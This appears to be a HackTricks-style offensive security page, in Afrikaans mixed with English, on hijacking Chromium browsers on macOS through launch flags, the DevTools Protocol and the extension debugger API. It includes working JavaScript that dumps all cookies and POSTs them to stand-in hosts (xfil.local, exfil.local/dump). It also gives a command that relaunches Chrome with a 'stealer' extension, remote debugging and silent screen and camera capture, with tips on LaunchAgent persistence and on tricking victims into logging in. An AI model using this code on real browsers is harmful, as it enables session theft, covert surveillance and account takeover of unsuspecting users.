# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

Chromium-gebaseerde blaaiers soos Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi en Opera gebruik almal dieselfde command-line switches, preference files en DevTools-automatiseringsinterfaces. Op macOS kan enige gebruiker met GUI-toegang 'n bestaande blaaieressie beëindig en dit heropen met ewekansige flags, extensions of DevTools-endpunte wat met die teiken se entitlements loop.

#### Lancering van Chromium met pasgemaakte flags op macOS

macOS hou 'n enkele UI-instansie per Chromium-profiel, dus instrumentering vereis gewoonlik dat die blaaier gedwing word om te sluit (byvoorbeeld met `osascript -e 'tell application "Google Chrome" to quit'`). Aanvallers heropen dit tipies met `open -na "Google Chrome" --args <flags>` sodat hulle argumente kan injekteer sonder om die app-bundel te wysig. Om daardie opdrag binne 'n user LaunchAgent (`~/Library/LaunchAgents/*.plist`) of 'n login hook te plaas, verseker dat die gemanipuleerde blaaier na reboot/logoff weer opgestart word.

#### `--load-extension` Flag

Die `--load-extension` flag laai outomaties unpacked extensions (komma-geskeide paaie). Kombineer dit met `--disable-extensions-except` om legitieme extensions te blokkeer en slegs jou payload te dwing om te loop. Kwaadwillige extensions kan hoë-impak toestemminge versoek soos `debugger`, `webRequest` en `cookies` om in DevTools protocols te pivot, CSP-headers te patch, HTTPS af te gradeer, of sessiemateriaal te exfiltrateer sodra die blaaier begin.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Hierdie switches openbaar die Chrome DevTools Protocol (CDP) oor TCP of 'n pipe sodat eksterne gereedskap die blaaier kan bestuur. Google het wydverspreide infostealer-misbruik van hierdie koppelvlak waargeneem en, beginnende met Chrome 136 (March 2025), word die switches vir die default profile geïgnoreer tensy die blaaier met 'n nie-standaard `--user-data-dir` gelanseer word. Dit dwing App-Bound Encryption af op regte profiles, maar aanvallers kan steeds 'n vars profiel skep, die slagoffer dwing om binne dit te autentiseer (phishing/triage assistance), en cookies, tokens, device trust states of WebAuthn-registrasies via CDP oes.

#### `--user-data-dir` Flag

Hierdie flag herlei die hele blaaierprofiel (History, Cookies, Login Data, Preference files, etc.) na 'n pad onder aanvallerbeheer. Dit is verpligtend wanneer moderne Chrome-bouwerkies met `--remote-debugging-port` gekombineer word, en dit hou die gemanipuleerde profiel geïsoleer sodat jy vooraf-gevulde `Preferences` of `Secure Preferences` lêers kan neersit wat sekuriteitspromptjies deaktiveer, extensions outomaties installeer, en verstekskemas verander.

#### `--use-fake-ui-for-media-stream` Flag

Hierdie switch omseil die camera/mic toestemming-prompt sodat enige bladsy wat `getUserMedia` aanroep onmiddellik toegang kry. Kombineer dit met flags soos `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, of CDP `Browser.grantPermissions` opdragte om stil audio/video, desk-share vas te vang, of WebRTC-permissiekontroles sonder gebruikerinteraksie te bevredig.

## Remote Debugging & DevTools Protocol Abuse

Sodra Chrome heropen is met 'n toegewyde `--user-data-dir` en `--remote-debugging-port`, kan jy oor CDP koppel (bv. via `chrome-remote-interface`, `puppeteer` of `playwright`) en hoë-privilegie werkvloei skrip:

- **Cookie/session theft:** `Network.getAllCookies` en `Storage.getCookies` gee HttpOnly-waardes terug selfs wanneer App-Bound encryption normaalweg lêerstelseltoegang sou blokkeer, omdat CDP die lopende blaaier vra om dit te ontsleutel.
- **Permission tampering:** `Browser.grantPermissions` en `Emulation.setGeolocationOverride` laat jou kamera/mik-promptjies omseil (veral wanneer gekombineer met `--use-fake-ui-for-media-stream`) of liggingsgebaseerde sekuriteitskontroles valseer.
- **Keystroke/script injection:** `Runtime.evaluate` voer arbitrary JavaScript in die aktiewe blad uit, wat credential lifting, DOM patching, of die injecteer van persistence beacons wat navigasie oorleef, moontlik maak.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` en `Fetch.enable` onderskep geauthentiseerde versoeke/antwoorde in reële tyd sonder om skyfartefakte te raak.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Omdat Chrome 136 CDP op die standaardprofiel blokkeer, lewer die copy/paste van die slagoffer se bestaande `~/Library/Application Support/Google/Chrome`-gids na 'n staging path nie meer gedekripteerde cookies op nie. In plaas daarvan, social-engineer die gebruiker om binne die instrumented profiel te autentiseer (bv. "helpful" support session) of capture MFA tokens in transit via CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

Die 2023-ondersoek "Chrowned by an Extension" het getoon dat 'n kwaadwillige extension wat die `chrome.debugger` API gebruik, by enige tab kan aanheg en dieselfde DevTools-kragte as `--remote-debugging-port` kan bekom. Dit breek die oorspronklike isolasie-aanname (extensions bly in hul konteks) en stel in staat:

- Silent cookie and credential theft with `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modification of site permissions (camera, microphone, geolocation) and security interstitial bypass, letting phishing pages impersonate Chrome dialogs.
- On-path tampering of TLS warnings, downloads, or WebAuthn prompts by programmatically driving `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, or `Security.handleCertificateError`.

Laai die extension met `--load-extension`/`--disable-extensions-except` sodat geen gebruikersinteraksie benodig word nie. 'n Minimale background script wat die API weaponizes, lyk soos volg:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die extension kan ook inteken op `Debugger.paused` events om JavaScript-variabels te lees, inline scripts te patch, of custom breakpoints te plaas wat navigasie oorleef. Omdat alles binne die gebruiker se GUI-sessie loop, word Gatekeeper en TCC nie geaktiveer nie, wat hierdie tegniek ideaal maak vir malware wat reeds uitvoering onder die gebruiker-konteks bewerkstellig het.

### Gereedskap

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiseer Chromium-opstart met payload extensions en maak interaktiewe CDP-hooks beskikbaar.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Vergelykbare tooling gefokus op traffic interception en browser instrumentation vir macOS-operateurs.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-biblioteek om Chrome DevTools Protocol dumps (cookies, DOM, permissions) te script sodra 'n `--remote-debugging-port` instansie aan die gang is.

### Voorbeeld
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Vind meer voorbeelde in die tools links.

## References

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
